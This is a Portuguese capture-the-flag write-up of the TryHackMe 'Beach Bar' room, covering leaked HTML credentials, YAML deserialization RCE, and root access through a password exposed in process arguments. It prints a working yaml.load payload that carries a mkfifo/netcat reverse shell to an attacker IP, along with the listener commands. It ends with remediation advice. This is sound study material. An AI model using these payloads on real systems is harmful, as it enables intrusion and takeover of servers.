# Beach Bar — TryHackMe

> **Dificuldade:** Fácil  
> **Categoria:** Exploração Web · Desserialização Insegura · Divulgação de Informações · Escalação de Privilégios  
> **Data:** 2025-08-05  
> **Sala:** [https://tryhackme.com/room/beachbar](https://tryhackme.com/room/hh-beachbar-d849f7f7)

---

## overview

Sala Boot2Root rodando uma aplicação web Python (Gunicorn) com uma funcionalidade de gerenciamento de playlists de Jukebox. O acesso inicial vem de credenciais vazadas no código-fonte HTML, seguido de Execução Remota de Código via desserialização YAML insegura. A escalação de privilégios explora um erro clássico: credenciais passadas como argumentos de processo em texto claro, visíveis para qualquer usuário no sistema.

---

## reconnaissance

```bash
nmap -sV -sC -p- -T4 <TARGET_IP>
```

| porta | serviço | detalhe |
|---|---|---|
| 80/tcp | http | Gunicorn — redireciona para /login |
| 22/tcp | ssh | OpenSSH |

Durante a revisão da aplicação web, a inspeção manual do código-fonte HTML na página principal revelou um comentário de desenvolvedor contendo credenciais de teste:

```html
<!-- test user: dj / dj -->
```

Information Disclosure logo no primeiro passo — sem necessidade de força bruta.

---

## enumeration

### Aplicação web — /login

O acesso autenticado com as credenciais vazadas `dj:dj` revelou uma interface de Jukebox com funcionalidade de gerenciamento de playlists. A funcionalidade mais interessante: **exportação/importação de playlists**, que retornava um arquivo estruturado em YAML.

Estrutura da playlist exportada:

```yaml
playlist:
  name: golden hour
  vibe: chill
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
```

A aplicação aceitava arquivos YAML para importação — e os processava no lado do servidor com Python. Isso levantou imediatamente a questão: ela usa `yaml.load()` ou `yaml.safe_load()`?

---

## exploitation

### Desserialização YAML Insegura — RCE

O `yaml.load()` do Python sem um loader seguro permite a instanciação arbitrária de objetos via tags YAML customizadas. A tag `!!python/object/apply:os.system` força o interpretador a invocar uma chamada de sistema diretamente durante a desserialização.

**Configuração do listener:**

```bash
nc -lnvp 4444
```

**Payload YAML malicioso:**

```yaml
playlist:
  name: !!python/object/apply:os.system ["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f"]
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
```

O payload cria um Named Pipe para estabelecer um shell reverso interativo, contornando eventuais restrições de firewall de entrada.

Importar o arquivo malicioso via upload de playlist disparou a execução no lado do servidor.

**Estabilização do shell:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> **Vulnerabilidade:** Desserialização Insegura (CWE-502)  
> **Causa raiz:** Aplicação usando `yaml.load()` em vez de `yaml.safe_load()`, permitindo a instanciação de objetos Python arbitrários a partir de input fornecido pelo usuário.  
> **MITRE ATT&CK:** T1059 — Command and Scripting Interpreter

**Flag de usuário capturada:**

```
THM{CENSURADO}
```

---

## privilege escalation

### Enumeração de processos — credenciais em argumentos em texto claro

Com um shell estável como usuário da aplicação, o próximo passo foi a enumeração da infraestrutura local em busca de misconfigurations.

```bash
ps auxww --forest
```

A flag `ww` é crítica aqui — ela impede o truncamento de argumentos, garantindo que linhas de comando longas sejam exibidas por completo. Entre os processos em execução, um se destacou imediatamente:

```
root  /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py
      --stream-pass SunsetSpritz2024! --bitrate 320k
```

O processo root estava passando sua senha como **argumento de linha de comando** — visível para qualquer usuário do sistema via `ps`. Esta é uma vulnerabilidade grave de Information Disclosure.

> **Vulnerabilidade:** Credenciais em Argumentos de Processo (CWE-214)  
> **MITRE ATT&CK:** T1057 — Process Discovery  
> **Severidade:** Crítica

### Reutilização de credencial

Testando a senha descoberta contra a conta root:

```bash
su - root
# senha: SunsetSpritz2024!
```

Acesso root obtido.

---

## flags

```
Flag de usuário: THM{CENSURADO}
Flag de root:    THM{CENSURADO}
```

---

## attack chain

```
Nmap → porta 80 (Gunicorn) · porta 22 (SSH)
          │
          ▼
Código-fonte HTML → credenciais vazadas: dj / dj
          │
          ▼
/login → acesso autenticado → interface Jukebox
          │
          ▼
Exportação de playlist → estrutura YAML identificada
          │
          ▼
yaml.load() → desserialização insegura
          │
          ▼
YAML malicioso → !!python/object/apply:os.system
          │
          ▼
Shell reverso → nc -lnvp 4444
          │
          ▼
Flag de usuário: THM{CENSURADO}
          │
          ▼
ps auxww --forest → processo root com --stream-pass SunsetSpritz2024!
          │
          ▼
su - root (reutilização de credencial)
          │
          ▼
Flag de root: THM{CENSURADO}
```

---

## what I learned

Duas classes de vulnerabilidade completamente diferentes encadeadas — e ambas são devastadoramente simples de prevenir.

**Desserialização insegura** é um daqueles vetores que parecem abstratos até você ver funcionando. A diferença entre `yaml.load()` e `yaml.safe_load()` é uma palavra no código-fonte, mas o impacto é RCE completo. Qualquer aplicação que aceite dados serializados de usuários e os processe no lado do servidor precisa ser tratada como uma superfície potencial de ataque de desserialização.

**Credenciais em argumentos de processo** é um erro fácil de cometer e difícil de perceber. Desenvolvedores frequentemente passam segredos dessa forma durante testes e esquecem de mudar antes do deploy. A correção é usar variáveis de ambiente ou um gerenciador de segredos — nunca passar dados sensíveis como argumentos CLI, pois são legíveis por qualquer usuário com acesso ao `ps`.

A reutilização de credencial no final completou o cenário: a mesma senha que rodava o serviço de stream era a senha do root. Defense in depth significa que cada camada deve ter credenciais independentes.

**Remediação:**

```python
# Inseguro
data = yaml.load(user_input)

# Correto
data = yaml.safe_load(user_input)
```

```bash
# Inseguro — visível no output do ps
python app.py --stream-pass SunsetSpritz2024!

# Correto — usar variáveis de ambiente
export STREAM_PASS="SunsetSpritz2024!"
python app.py
```
